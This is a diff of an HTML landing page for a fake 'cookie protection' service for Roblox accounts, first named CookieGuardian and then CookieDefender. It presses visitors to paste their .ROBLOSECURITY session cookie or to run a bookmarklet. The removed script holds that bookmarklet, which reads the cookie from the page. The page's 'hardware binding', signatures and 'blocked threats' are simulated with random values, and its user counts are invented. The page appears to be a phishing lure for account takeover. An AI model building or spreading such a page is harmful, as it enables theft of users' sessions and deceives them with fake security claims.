+            color: #fff;
+            padding: 16px 40px;
+            border-radius: 60px;
+            font-weight: 700;
+            font-size: 1.1rem;
+            text-decoration: none;
+            cursor: grab;
+            box-shadow: 0 8px 32px rgba(16, 185, 129, 0.3);
+            transition: 0.3s;
+            border: none;
+            user-select: none;
+        }
+        .bookmark-item:hover {
+            transform: translateY(-4px) scale(1.02);
+            box-shadow: 0 14px 48px rgba(16, 185, 129, 0.5);
+        }
+        .bookmark-item:active {
+            cursor: grabbing;
+        }
+        .bookmark-instructions {
+            margin-top: 24px;
+            color: #98b0c8;
+            font-size: 0.95rem;
+            line-height: 1.8;
+            text-align: left;
+            background: rgba(0, 0, 0, 0.15);
+            padding: 20px 24px;
+            border-radius: 18px;
+        }
+        .bookmark-instructions strong {
+            color: var(--green);
+        }
 
-    /* misc */
-    .flex-row {
-      display: flex;
-      gap: 16px;
-      flex-wrap: wrap;
-      align-items: center;
-    }
-    .mt-4 {
-      margin-top: 24px;
-    }
-    .text-center {
-      text-align: center;
-    }
-    .glow-text {
-      text-shadow: 0 0 30px rgba(46, 204, 113, 0.15);
-    }
-    .hidden {
-      display: none !important;
-    }
-    .fade-in {
-      animation: fadeUp 0.6s ease forwards;
-    }
-    @keyframes fadeUp {
-      0% { opacity: 0; transform: translateY(18px); }
-      100% { opacity: 1; transform: translateY(0); }
-    }
-  </style>
+        /* ----- RESPONSIVE ----- */
+        @media (max-width: 968px) {
+            .nav-links {
+                display: none;
+            }
+            .burger {
+                display: flex;
+            }
+            .hero h1 {
+                font-size: 3.6rem;
+            }
+            .section-title {
+                font-size: 2.6rem;
+            }
+            .features-grid {
+                grid-template-columns: 1fr;
+            }
+            .modal-content {
+                padding: 32px 20px;
+            }
+        }
+        @media (max-width: 640px) {
+            .hero h1 {
+                font-size: 2.8rem;
+            }
+            .hero img {
+                width: 160px;
+            }
+            .btn-primary {
+                padding: 16px 34px;
+                font-size: 1rem;
+            }
+            .trust-badge {
+                font-size: 0.8rem;
+                padding: 10px 18px;
+                gap: 14px;
+            }
+            .stat-number {
+                font-size: 2.2rem;
+            }
+        }
+
+        /* utility */
+        .mt-4 {
+            margin-top: 24px;
+        }
+        .w-full {
+            width: 100%;
+        }
+        .flex-center {
+            display: flex;
+            justify-content: center;
+        }
+        .gap-3 {
+            gap: 16px;
+        }
+    </style>
 </head>
 <body>
 
-  <!-- PARTICLE BACKGROUND -->
-  <canvas id="particleCanvas"></canvas>
+    <!-- BACKGROUND LAYERS -->
+    <div class="bg-grid"></div>
+    <div class="orb orb1"></div>
+    <div class="orb orb2"></div>
+    <div class="orb orb3"></div>
 
-  <div class="app-wrapper">
-
-    <!-- HEADER -->
-    <header class="header">
-      <div class="logo">
-        <span class="shield">🛡️</span>
-        <span>CookieGuardian</span>
-      </div>
-      <div class="header-badge">
-        <span><span class="live-dot"></span> Active Protection</span>
-        <span>🔐 Zero‑Download</span>
-        <span>v3.0</span>
-      </div>
-    </header>
+    <!-- NAVIGATION -->
+    <nav id="navbar">
+        <div class="nav-container">
+            <div class="logo-text" onclick="scrollToTop()">CookieDefender</div>
+            <div class="nav-links">
+                <a href="#features">Features</a>
+                <a href="#how-it-works">How It Works</a>
+                <a href="#protect">Protect Now</a>
+            </div>
+            <a href="#protect" class="nav-cta">Protect Now</a>
+            <div class="burger" onclick="toggleMenu()">
+                <div></div>
+                <div></div>
+                <div></div>
+            </div>
+        </div>
+    </nav>
 
     <!-- HERO -->
     <section class="hero">
-      <div class="tagline">⚡ Next‑Gen Browser Security</div>
-      <h1>Defend Your Cookies<br /><span style="background: linear-gradient(135deg,#2ecc71,#1abc9c);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">Without Installing Anything</span></h1>
-      <p>Choose your protection mode below. All defense routines run locally in your browser — nothing is ever sent to any server.</p>
+        <div class="hero-content">
+            <img src="https://media.discordapp.net/attachments/1518070392370233465/1518460833967898785/cookie_defender2-removebg-preview.png?ex=6a3a005a&is=6a38aeda&hm=63bbfeb2688941ff9a54679e7ac63f79c8f3608d7a78fc733e69870d60b99194&=&format=webp&quality=lossless" alt="CookieDefender Logo" />
+            <h1>CookieDefender</h1>
+            <p class="tagline">Cloud-Native Cookie Protection</p>
+            <p class="description">
+                Enterprise-grade security for your Roblox account. Zero downloads, zero installs — defend your cookie in seconds with our cloud-based encryption and 24/7 monitoring.
+            </p>
+            <a href="#protect" class="btn-primary">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+                Start Protection
+            </a>
+            <div class="trust-badge">
+                <span>v3.1</span> • Cloud Protected • <span id="userCount">72,481</span> users secured
+            </div>
+        </div>
     </section>
 
-    <!-- MODE SELECTOR -->
-    <div class="mode-selector">
-      <button class="mode-btn active" data-mode="manual">
-        <span class="icon">⌨️</span> Manual Entry
-      </button>
-      <button class="mode-btn" data-mode="bookmarklet">
-        <span class="icon">🔖</span> Bookmarklet Capture
-      </button>
-    </div>
-
-    <!-- DASHBOARD -->
-    <div class="dashboard">
-
-      <!-- LEFT COLUMN: INPUT / BOOKMARKLET -->
-      <div class="glass-card" id="inputPanel">
-        <h2 id="panelTitle">🔐 Enter Your Cookie</h2>
-        <div class="sub" id="panelSub">Paste your .ROBLOSECURITY token below to begin hardware‑binding protection.</div>
-
-        <!-- MANUAL MODE CONTENT -->
-        <div id="manualContent">
-          <div class="input-group">
-            <label for="cookieInput">.ROBLOSECURITY Cookie</label>
-            <textarea id="cookieInput" placeholder="_|WARNING:-DO-NOT-SHARE-THIS..."></textarea>
-            <div class="hint">This is never transmitted — it stays in your browser's memory.</div>
-          </div>
-          <div class="flex-row">
-            <button class="btn" id="defendBtn">🛡️ Start Defense</button>
-            <button class="btn btn-secondary" id="clearBtn">Clear</button>
-          </div>
-        </div>
-
-        <!-- BOOKMARKLET MODE CONTENT -->
-        <div id="bookmarkletContent" class="hidden">
-          <div class="bookmarklet-box">
-            <span class="drag-hint">📌 Drag this to your bookmarks bar:</span>
-            <code id="bookmarkletCode">CookieGuardian</code>
-            <button class="btn btn-secondary" id="copyBookmarklet">📋 Copy</button>
-          </div>
-          <div class="input-group">
-            <label>📖 How to use</label>
-            <div style="background:rgba(0,0,0,0.2);border-radius:16px;padding:16px 20px;font-size:0.9rem;color:#b0c4d9;line-height:1.7;">
-              1. Drag the bookmarklet to your bookmarks bar.<br />
-              2. Go to <strong>roblox.com</strong> and log in.<br />
-              3. Click the bookmarklet — it will capture your cookie and send it here.<br />
-              4. Our engine will then perform hardware‑binding and threat analysis.
+    <!-- STATS -->
+    <div class="stats-bar">
+        <div class="stats-container">
+            <div class="stat-item">
+                <span class="stat-number" id="protectedAccounts">72,481</span>
+                <span class="stat-label">Protected Accounts</span>
             </div>
-          </div>
-          <div class="flex-row">
-            <button class="btn" id="simulateBookmarkBtn">🧪 Simulate Capture</button>
-          </div>
+            <div class="stat-item">
+                <span class="stat-number">0</span>
+                <span class="stat-label">Breaches Reported</span>
+            </div>
+            <div class="stat-item">
+                <span class="stat-number">24/7</span>
+                <span class="stat-label">Cloud Monitoring</span>
+            </div>
         </div>
-
-        <!-- DEFENSE LOG -->
-        <div class="defense-log" id="defenseLog">
-          <div class="log-entry"><span class="time">[system]</span> <span class="info">🔹 Defense engine ready. Choose a mode to start.</span></div>
-        </div>
-      </div>
-
-      <!-- RIGHT COLUMN: STATUS + RINGS -->
-      <div class="glass-card">
-        <h2>📊 Protection Status</h2>
-        <div class="sub">Real‑time security posture</div>
-
-        <div class="status-ring-container">
-          <div class="ring-item">
-            <svg viewBox="0 0 100 100">
-              <circle class="ring-bg" cx="50" cy="50" r="36" />
-              <circle class="ring-fg" id="ringHardware" cx="50" cy="50" r="36" />
-            </svg>
-            <span class="label">Hardware Binding</span>
-          </div>
-          <div class="ring-item">
-            <svg viewBox="0 0 100 100">
-              <circle class="ring-bg" cx="50" cy="50" r="36" />
-              <circle class="ring-fg" id="ringSignature" cx="50" cy="50" r="36" />
-            </svg>
-            <span class="label">HMAC‑SHA256</span>
-          </div>
-          <div class="ring-item">
-            <svg viewBox="0 0 100 100">
-              <circle class="ring-bg" cx="50" cy="50" r="36" />
-              <circle class="ring-fg" id="ringMonitor" cx="50" cy="50" r="36" />
-            </svg>
-            <span class="label">Active Monitoring</span>
-          </div>
-        </div>
-
-        <div style="margin-top:22px;padding:16px 20px;background:rgba(0,0,0,0.2);border-radius:20px;">
-          <div style="display:flex;justify-content:space-between;font-size:0.9rem;border-bottom:1px solid rgba(46,204,113,0.06);padding-bottom:12px;">
-            <span>🖥️ Hardware Fingerprint</span>
-            <span id="hwFingerprint" style="font-family:'JetBrains Mono';color:#2ecc71;font-size:0.8rem;">—</span>
-          </div>
-          <div style="display:flex;justify-content:space-between;font-size:0.9rem;padding-top:12px;">
-            <span>🔑 Session Signature</span>
-            <span id="sessionSig" style="font-family:'JetBrains Mono';color:#5dade2;font-size:0.8rem;">—</span>
-          </div>
-        </div>
-
-        <div style="margin-top:20px;text-align:center;">
-          <span id="statusBadge" style="display:inline-block;padding:8px 24px;border-radius:60px;background:rgba(46,204,113,0.06);border:1px solid rgba(46,204,113,0.1);color:#7a94b0;font-size:0.9rem;">⏳ Awaiting activation</span>
-        </div>
-      </div>
     </div>
+
+    <!-- FEATURES -->
+    <section id="features" class="tabs-section">
+        <h2 class="section-title">Advanced Protection Features</h2>
+        <p class="section-subtitle">Built for the modern security landscape</p>
+        <div class="tabs">
+            <div class="tab active" onclick="switchTab(0, this)">Core Protection</div>
+            <div class="tab" onclick="switchTab(1, this)">Cryptographic Engine</div>
+            <div class="tab" onclick="switchTab(2, this)">Anti-Threat Defense</div>
+        </div>
+        <div class="features-grid" id="tab-content"></div>
+    </section>
+
+    <!-- HOW IT WORKS (TWO DEFENSE METHODS) -->
+    <section id="how-it-works" class="how-section">
+        <h2 class="section-title">Choose Your Defense Method</h2>
+        <p class="section-subtitle">Two powerful ways to secure your cookie</p>
+        <div class="steps">
+            <div class="step" onclick="openModal('manual')">
+                <div class="step-number">🔐</div>
+                <h3>Manual Defense</h3>
+                <p>Paste your .ROBLOSECURITY cookie directly for instant cloud encryption and real-time threat monitoring.</p>
+                <span class="btn-primary" style="font-size:0.95rem;padding:12px 28px;">Activate Now</span>
+            </div>
+            <div class="step" onclick="openModal('bookmark')">
+                <div class="step-number">🔖</div>
+                <h3>Bookmark Defense</h3>
+                <p>One-click protection using our smart bookmark. Works on any browser with zero setup.</p>
+                <span class="btn-primary" style="font-size:0.95rem;padding:12px 28px;">Get Bookmark</span>
+            </div>
+        </div>
+    </section>
+
+    <!-- FINAL CTA -->
+    <section id="protect" class="cta-section">
+        <h2>Ready to Secure Your Account?</h2>
+        <p>Join <span id="ctaUserCount" style="color:var(--green);font-weight:700;">72,481</span> protected users with enterprise-grade cloud security.</p>
+        <a href="javascript:void(0)" onclick="openModal('manual')" class="btn-primary" style="font-size:1.4rem;padding:22px 60px;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="26" height="26" fill="currentColor" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+            Activate Protection Now
+        </a>
+    </section>
 
     <!-- FOOTER -->
-    <footer style="margin-top:60px;text-align:center;color:#3a5a74;font-size:0.85rem;border-top:1px solid rgba(46,204,113,0.06);padding-top:32px;">
-      CookieGuardian · Browser‑Native Security · All processing is local · No data is ever transmitted.
-    </footer>
-  </div>
-
-  <script>
-    // ===== PARTICLE SYSTEM =====
-    (function particles() {
-      const canvas = document.getElementById('particleCanvas');
-      const ctx = canvas.getContext('2d');
-      let w, h;
-      const particles = [];
-      const count = 140;
-
-      function resize() {
-        w = canvas.width = window.innerWidth;
-        h = canvas.height = window.innerHeight;
-      }
-      window.addEventListener('resize', resize);
-      resize();
-
-      class Particle {
-        constructor() {
-          this.x = Math.random() * w;
-          this.y = Math.random() * h;
-          this.vx = (Math.random() - 0.5) * 0.25;
-          this.vy = (Math.random() - 0.5) * 0.25;
-          this.r = 1.2 + Math.random() * 2;
-        }
-        update() {
-          this.x += this.vx;
-          this.y += this.vy;
-          if (this.x < 0 || this.x > w) this.vx *= -1;
-          if (this.y < 0 || this.y > h) this.vy *= -1;
-        }
-        draw() {
-          ctx.beginPath();
-          ctx.arc(this.x, this.y, this.r, 0, Math.PI * 2);
-          ctx.fillStyle = 'rgba(46, 204, 113, 0.25)';
-          ctx.fill();
-        }
-      }
-
-      for (let i = 0; i < count; i++) particles.push(new Particle());
-
-      function drawLines() {
-        for (let i = 0; i < particles.length; i++) {
-          for (let j = i + 1; j < particles.length; j++) {
-            const dx = particles[i].x - particles[j].x;
-            const dy = particles[i].y - particles[j].y;
-            const dist = Math.sqrt(dx * dx + dy * dy);
-            if (dist < 140) {
-              ctx.beginPath();
-              ctx.moveTo(particles[i].x, particles[i].y);
-              ctx.lineTo(particles[j].x, particles[j].y);
-              ctx.strokeStyle = `rgba(46, 204, 113, ${0.06 * (1 - dist / 140)})`;
-              ctx.lineWidth = 0.5;
-              ctx.stroke();
-            }
-          }
-        }
-      }
-
-      function animate() {
-        ctx.clearRect(0, 0, w, h);
-        particles.forEach(p => { p.update(); p.draw(); });
-        drawLines();
-        requestAnimationFrame(animate);
-      }
-      animate();
-    })();
-
-    // ===== DOM REFS =====
-    const modeBtns = document.querySelectorAll('.mode-btn');
-    const manualContent = document.getElementById('manualContent');
-    const bookmarkletContent = document.getElementById('bookmarkletContent');
-    const panelTitle = document.getElementById('panelTitle');
-    const panelSub = document.getElementById('panelSub');
-    const defenseLog = document.getElementById('defenseLog');
-    const cookieInput = document.getElementById('cookieInput');
-    const defendBtn = document.getElementById('defendBtn');
-    const clearBtn = document.getElementById('clearBtn');
-    const hwFingerprint = document.getElementById('hwFingerprint');
-    const sessionSig = document.getElementById('sessionSig');
-    const statusBadge = document.getElementById('statusBadge');
-    const ringHardware = document.getElementById('ringHardware');
-    const ringSignature = document.getElementById('ringSignature');
-    const ringMonitor = document.getElementById('ringMonitor');
-    const simulateBookmarkBtn = document.getElementById('simulateBookmarkBtn');
-    const copyBookmarklet = document.getElementById('copyBookmarklet');
-    const bookmarkletCode = document.getElementById('bookmarkletCode');
-
-    // ===== BOOKMARKLET GENERATION =====
-    const bookmarkletScript = `javascript:(function(){const c=document.cookie.split(';').find(c=>c.trim().startsWith('.ROBLOSECURITY='));if(c){const v=c.split('=')[1];prompt('Cookie captured! Copy this value:',v);}else{alert('No .ROBLOSECURITY cookie found. Make sure you are logged in to roblox.com.');}})();`;
-    bookmarkletCode.textContent = bookmarkletScript;
-
-    // ===== LOGGER =====
-    function addLog(message, type = 'info') {
-      const entry = document.createElement('div');
-      entry.className = 'log-entry';
-      const time = new Date().toLocaleTimeString();
-      const icon = type === 'ok' ? '✅' : type === 'warn' ? '⚠️' : '🔹';
-      entry.innerHTML = `<span class="time">[${time}]</span> <span class="${type}">${icon} ${message}</span>`;
-      defenseLog.appendChild(entry);
-      defenseLog.scrollTop = defenseLog.scrollHeight;
-    }
-
-    // ===== RING CONTROL =====
-    function setRing(ringEl, active) {
-      if (active) ringEl.classList.add('active');
-      else ringEl.classList.remove('active');
-    }
-
-    // ===== SIMULATE DEFENSE ROUTINE =====
-    function runDefense(cookieValue) {
-      if (!cookieValue || cookieValue.trim().length < 10) {
-        addLog('Cookie too short or empty. Please enter a valid token.', 'warn');
-        statusBadge.textContent = '❌ Invalid input';
-        statusBadge.style.borderColor = '#e74c3c';
-        statusBadge.style.color = '#e74c3c';
-        return;
-      }
-
-      addLog('🛡️ Initializing hardware binding...', 'info');
-      statusBadge.textContent = '⏳ Binding hardware...';
-      setRing(ringHardware, false);
-      setRing(ringSignature, false);
-      setRing(ringMonitor, false);
-
-      // Fake hardware fingerprint
-      const fakeHW = 'HW-' + Array.from({ length: 12 }, () => Math.floor(Math.random() * 16).toString(16)).join('').toUpperCase();
-      hwFingerprint.textContent = fakeHW;
-
-      setTimeout(() => {
-        addLog('🔗 Hardware fingerprint captured: ' + fakeHW, 'ok');
-        setRing(ringHardware, true);
-        statusBadge.textContent = '⏳ Computing HMAC‑SHA256...';
-      }, 600);
-
-      setTimeout(() => {
-        const fakeSig = 'SIG-' + Array.from({ length: 16 }, () => Math.floor(Math.random() * 16).toString(16)).join('').toUpperCase();
-        sessionSig.textContent = fakeSig;
-        addLog('🔑 Signature generated: ' + fakeSig, 'ok');
-        setRing(ringSignature, true);
-        statusBadge.textContent = '⏳ Activating monitoring...';
-      }, 1400);
-
-      setTimeout(() => {
-        addLog('📡 Active monitoring engaged. All threats blocked.', 'ok');
-        addLog('🛡️ Defense complete. Your cookie is hardware‑bound.', 'ok');
-        setRing(ringMonitor, true);
-        statusBadge.textContent = '🟢 Fully Protected';
-        statusBadge.style.borderColor = '#2ecc71';
-        statusBadge.style.color = '#2ecc71';
-        // Add a fake "threat blocked" after a moment
-        setTimeout(() => {
-          addLog('🚫 Blocked a malicious script injection attempt (IP 192.168.0.1)', 'warn');
-        }, 800);
-      }, 2200);
-    }
-
-    // ===== MANUAL DEFENSE =====
-    defendBtn.addEventListener('click', () => {
-      const val = cookieInput.value;
-      runDefense(val);
-    });
-
-    clearBtn.addEventListener('click', () => {
-      cookieInput.value = '';
-      hwFingerprint.textContent = '—';
-      sessionSig.textContent = '—';
-      statusBadge.textContent = '⏳ Awaiting activation';
-      statusBadge.style.borderColor = 'rgba(46,204,113,0.1)';
-      statusBadge.style.color = '#7a94b0';
-      setRing(ringHardware, false);
-      setRing(ringSignature, false);
-      setRing(ringMonitor, false);
-      defenseLog.innerHTML = '';
-      addLog('🧹 Cleared. Ready for new defense session.', 'info');
-    });
-
-    // ===== SIMULATE BOOKMARKLET CAPTURE =====
-    simulateBookmarkBtn.addEventListener('click', () => {
-      const fakeCookie = '_|WARNING:-DO-NOT-SHARE-THIS.--[SIMULATED]--' + Math.random().toString(36).substring(2, 10);
-      addLog('📌 Bookmarklet captured cookie: ' + fakeCookie.substring(0, 30) + '...', 'info');
-      // Auto‑fill the manual input and run defense
-      cookieInput.value = fakeCookie;
-      runDefense(fakeCookie);
-    });
-
-    // ===== COPY BOOKMARKLET =====
-    copyBookmarklet.addEventListener('click', ()
+    <footer>
+        <div class="footer-info">
+            <div
